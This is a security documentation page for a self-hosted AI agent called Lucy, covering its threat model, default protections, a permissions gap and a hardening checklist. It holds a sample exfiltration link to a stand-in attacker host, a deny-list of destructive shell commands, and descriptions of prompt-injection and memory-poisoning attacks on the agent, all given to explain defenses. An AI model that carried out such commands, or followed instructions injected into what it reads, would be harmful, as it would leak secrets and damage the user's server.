# Security

Lucy is an AI agent with a shell, file access and your API keys, and you reach her through chat. Treat a Lucy install like an SSH login to the server: anyone who can talk to her can, in practice, run commands as the user she runs as.

This page explains what Lucy protects by default, where the gaps are, and how to harden an install.

## Threat model

| Asset | Why it matters |
|---|---|
| The server | Claude runs with full tool access (Bash, file read/write) as the PM2 user |
| Secrets | Telegram bot token, LLM provider keys, MCP credentials (GitHub, Google…), `AM_TOKEN`, hub password, all in env files on the box |
| Memory vault | Personal facts and preferences Lucy has learned. It is also an input to every future turn |
| Your accounts | Anything reachable through MCP servers or tokens Lucy holds |

Main ways in:

1. **Someone else talks to Lucy.** An open Telegram bot, a weak hub password, or a hub exposed without TLS.
2. **Prompt injection.** Instructions hidden in a web page, file, email, issue or tool result that Lucy reads, which make her do something you did not ask for.
3. **Supply chain.** A malicious skill, MCP server or npm/pip package.
4. **Memory poisoning.** Injected "facts" or preferences that get written to the vault and then steer later turns.
5. **Data leaks.** Secrets copied into logs, memory, chat history or third-party APIs.

## What Lucy does by default

### Telegram allow-list

The bridge only answers the Telegram user whose numeric ID is in `LUCY_ALLOWED_USER_ID` (`bridge/.env`). Everyone else gets "⛔ Không có quyền." (no permission).

::: danger Set it before you start the bot
If `LUCY_ALLOWED_USER_ID` is **empty, the bridge answers everyone** who finds the bot. The status message shows `uid=(mở!)` ("open!") in that case. Always set it:

```ini
LUCY_ALLOWED_USER_ID=<your-numeric-telegram-id>
```
:::

### Link previews disabled

Every message the bridge sends goes through one helper that sets `link_preview_options.is_disabled = true`. Telegram's servers fetch the URL behind a link preview, so an injected link such as `https://attacker.example/?d=<secret>` could leak data without anyone clicking it. Hub schedule pushes and token-guard alerts also turn previews off. The bridge also replaces the bot token with `<bot-token>` in error logs.

### Hub login

| Control | Detail |
|---|---|
| Password | `LUCY_HUB_PASSWORD`. If it is empty, login is impossible (the hub warns at startup) |
| Timing-safe compare | Both sides are SHA-256 hashed, then compared with `crypto.timingSafeEqual` |
| Per-IP lockout | 5 failed attempts (password or 2FA code) within 15 minutes block that IP until the window ends (HTTP 429) |
| Session expiry | Random 24-byte token in an `httpOnly`, `SameSite=Lax` cookie, `Secure` over HTTPS, valid for 7 days. Sessions are in memory and cleared when the hub restarts |
| Optional TOTP | Enable under Settings → 2FA (see [Web hub](./web-hub#turning-on-2fa)) |
| Every API route | Checks the session cookie. File reads are confined to `LUCY_PROJECTS_ROOT`, and memory clean-up is confined to the vault |
| Behind a proxy | `trust proxy` is set to loopback only, so the lockout sees the real client IP from nginx |

The lockout counters and sessions are in memory, so they reset when the hub restarts. The TOTP secret is stored in plain text in `$LUCY_STATE/twofa.json`; keep that directory private (`chmod 700`).

### Services on localhost

| Service | Port | Bind |
|---|---|---|
| `lucy-hub` | 8800 | `LUCY_HUB_HOST`. **The code default is `0.0.0.0`**; the shipped `.env.runtime.example` sets `127.0.0.1` |
| `lucy-coordinator` | 8780 | `127.0.0.1` by default (`AM_HOST`), with workers authenticated by `AM_TOKEN` |
| `lucy-pxpipe` | 47821 | `127.0.0.1` |
| `noteflow-view` | 8090 | `127.0.0.1` |

Only nginx should face the internet. Check what is listening:

```bash
ss -ltnp | grep -E ':(8800|8780|47821|8090)\b'   # expect 127.0.0.1 only
```

### Clean environment in PM2

`ecosystem.config.cjs` gives every process `filter_env: true`, so variables from the shell you run `pm2 start` in (session IDs, passwords you exported) do **not** leak into Lucy's processes. Each process gets only the values in `.env.llm`, `agent-machine/.env`, `bridge/.env` and `.env.runtime` (later files override earlier ones). PM2 also warns at startup if `LUCY_HUB_PASSWORD` or `AM_TOKEN` is missing.

### Secret redaction before memory

The same redaction rules exist in three places (`agent-machine/src/redact.ts`, the bridge's `scrub_secrets`, and the hub's `scrubSecrets`). They replace with `[REDACTED]`:

- `Bearer <token>`
- keys starting with `sk-`, `rk-`, `pk-`, `jina_`, `ghp_`/`gho_`/`ghs_`/`ghr_`/`github_pat_`, `xox?-` (Slack) and `AKIA…` (AWS)
- `SOMETHING_API_KEY=…`, `…_TOKEN=…`, `…_SECRET=…`, `…PASSWORD=…` (the name is kept, the value hidden)
- long base64-like strings that look random (40+ characters of mixed case and digits, or containing `+`, `/` or `=`)

Redaction runs **before** a chat turn is saved to episodic memory, before session summaries are stored, before text is sent to the embedding API, and before Prompt Architect sessions are saved.

It does **not** cover everything. Hub chat history files (`$LUCY_STATE/chats/`), the hub event log and PM2 logs keep what was typed. So do not paste secrets into chat. Put them in env files instead.

### Token guard

A daily token budget for the agent board. It survives restarts and resets at midnight in the `LUCY_TZ_OFFSET` timezone (default UTC+7):

| Variable | Default | When reached |
|---|---|---|
| `AM_DAY_TOKEN_SOFT` | 800,000,000 | Executors are downgraded to the cheapest model; Telegram warning |
| `AM_DAY_TOKEN_HARD` | 1,500,000,000 | New cards wait for your decision; the autopilot stops; Telegram alert |

The defaults are very high. Set limits that match your budget in `agent-machine/.env`. The same file also sets USD limits: a per-card cap (`AM_PER_CARD_USD`, default $2), a cap per rolling 5-hour window (`AM_CAP_USD`, default $20) and a weekly cap (`AM_WEEKLY_CAP_USD`, default $120). The guard watches board spend. It does not block chat from Telegram or the hub.

### Autopilot limits

The autopilot never auto-approves `devops` or `security` gates or the `secure-ship` pipeline, and it stops after `AM_AUTOPILOT_MAX` decisions. See [Automations](./automations#agent-autopilot).

## Known gap: full permissions

::: warning Lucy currently runs Claude with no permission prompts
The hub (chat, schedules, VPS cleanup), the Telegram bridge, board workers and the autopilot start Claude with `permissionMode: bypassPermissions` and the environment variable `IS_SANDBOX=1`. Together they make Claude Code skip every "may I run this?" confirmation, and `IS_SANDBOX=1` also lets that mode run as root.
:::

What that means:

- Any instruction that reaches Claude, yours or injected, can run shell commands, edit or delete files, read env files and make network requests **without asking**.
- The VPS cleanup "allow-list" and "do not touch" rules are only instructions in the prompt. Nothing enforces them.
- `IS_SANDBOX=1` does **not** create a sandbox. It only tells the CLI to assume it is already in one.
- Board workers can turn on an extra Bash guard with `LUCY_HOOKS=1`. A `PreToolUse` hook then blocks commands that match patterns like `rm -rf /`, `git push`, `mkfs`, `dd if=`, `curl … | sh`, `shutdown`, or PM2 restarts of the bridge. This is a deny-list, so it is easy to get around. It does not apply to hub or Telegram chat.

How to reduce the risk:

1. **Do not run Lucy as root.** Create a dedicated user, give it ownership of the Lucy folders only, and run PM2 as that user (`pm2 startup -u lucy`). Then a bad command is limited to that user's files.
2. **Run Lucy on a box with nothing else of value**, such as a small dedicated VPS or a VM or container. Do not run her on a machine that holds other people's data or production databases.
3. **Keep high-value credentials out of the env.** Give MCP servers and tokens the smallest scopes possible (for example a fine-grained GitHub token limited to specific repos).
4. **Prefer `LUCY_HOOKS=1`** on workers, and keep protected gates (devops, security) for anything that deploys.
5. **Moving off `bypassPermissions`** needs code changes (permission mode plus `allowedTools`/`disallowedTools`, or a real sandbox). Expect some features to need confirmations if you do.

## Hardening checklist

### 1. Firewall: only 22, 80 and 443

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80,443/tcp
sudo ufw enable
sudo ufw status verbose
```

Do not open 8800, 8780, 47821 or 8090. Remove any extra rules left over from experiments. Also harden SSH: use keys only (`PasswordAuthentication no`), and consider `fail2ban`.

### 2. TLS for the hub

Without TLS the password, the TOTP code and the session cookie cross the network in clear text. Pick one option:

**nginx + certbot** (public domain). Copy `hub/nginx-lucy.conf.example` to `/etc/nginx/sites-available/lucy`, set `server_name hub.example.com`, enable it, then:

```bash
sudo nginx -t && sudo systemctl reload nginx
sudo certbot --nginx -d hub.example.com      # adds 443 and the HTTP→HTTPS redirect
```

Keep `LUCY_HUB_HOST=127.0.0.1` so only nginx can reach the hub.

**Tailscale** (private). Do not expose the hub publicly at all. Keep it on `127.0.0.1` and publish it only to your tailnet, e.g. `tailscale serve --bg 8800`. Then you can close 80/443 too if nothing else needs them.

**Cloudflare Tunnel.** `cloudflared` connects outward, so no inbound port is needed. Point the tunnel at `http://127.0.0.1:8800`, and consider putting Cloudflare Access in front of it.

In every case, turn on 2FA in Settings.

### 3. Strong, unique secrets

- `LUCY_HUB_PASSWORD`: long and random, e.g. `openssl rand -base64 24`.
- `AM_TOKEN`: random, e.g. `openssl rand -hex 32`.
- Env files: `chmod 600`, owned by the Lucy user, never committed (they are gitignored).

### 4. Review skills and MCP servers before installing

Skills are instructions Claude follows with full permissions, and MCP servers are code that runs with your credentials.

- Read the whole `SKILL.md` and every script it ships. Look for `curl | sh`, encoded blobs, network calls to unknown hosts, and instructions to read env files or send data out.
- Prefer MCP servers from sources you trust, pin their versions, and give them the narrowest token scope.
- Turn MCP on one server at a time (`LUCY_MCP_<ID>=on`) and watch the **Kết nối** tab.
- Approve self-proposed skills (`skills/_proposed/`) only after reading them.

### 5. Prompt injection

Anything Lucy reads can contain instructions: web pages, PDFs, emails, GitHub issues, tool output, even file names.

- Be careful when asking Lucy to "go read this link and do what it says", especially on a run with shell access.
- Use a **lane** model without tools for summarising untrusted text when you can.
- Keep link previews disabled (the default) and do not re-enable them in your own scripts.
- Watch for unexpected tool calls in the hub chat's 🔧 cards.

### 6. Memory poisoning

Lucy's vault feeds every future turn through recall and `active.md`.

- Review **Bộ não → Đã học** now and then. Use 👎 on preferences that are wrong, and keep important ones pinned (📌).
- Read the nightly dream report on Telegram, and `Brain/proposals/consolidate-<date>.md` when consolidation runs.
- Keep the vault in git (it is its own repository) so you can diff and revert: `git -C <vault> log -p`.
- Before running QA or test scripts that talk to Lucy, snapshot the vault and restore it afterwards. Those runs write to memory.

### 7. Rotate secrets

Rotate right away if a secret may have leaked (pasted into chat, shown in a screenshot, committed by mistake), and on a schedule otherwise:

| Secret | Where to rotate |
|---|---|
| Telegram bot token | `@BotFather` → `/revoke`, then update `bridge/.env` |
| Provider API keys | Each provider's console, then `.env.llm` |
| MCP tokens (GitHub, Google…) | The provider, then `.env.llm` |
| `AM_TOKEN` | `agent-machine/.env` (coordinator and workers read the same value) |
| `LUCY_HUB_PASSWORD` | `.env.runtime` (restarting the hub also ends all sessions) |
| TOTP | Settings → disable 2FA → enable again with a new QR code |

PM2 only reads env files when a process starts, so after editing:

```bash
pm2 delete <name> && pm2 start ecosystem.config.cjs --only <name>
```

### 8. Backups

Back up these items regularly, and keep at least one copy off the server:

| What | Where (defaults) |
|---|---|
| Memory vault | `LUCY_VAULT` (a git repository; push it to a **private** remote) |
| Hub state | `LUCY_STATE` (`~/.lucy-hub/`): chats, schedules, 2FA secret, event log |
| Board data | `AM_DATA` in `agent-machine/.env` |
| Env files | `.env.llm`, `.env.runtime`, `agent-machine/.env`, `bridge/.env`. Encrypt these, since they contain secrets |
| Crontab | `crontab -l > crontab.backup` |

Test a restore at least once. A backup you have never restored is only a guess.
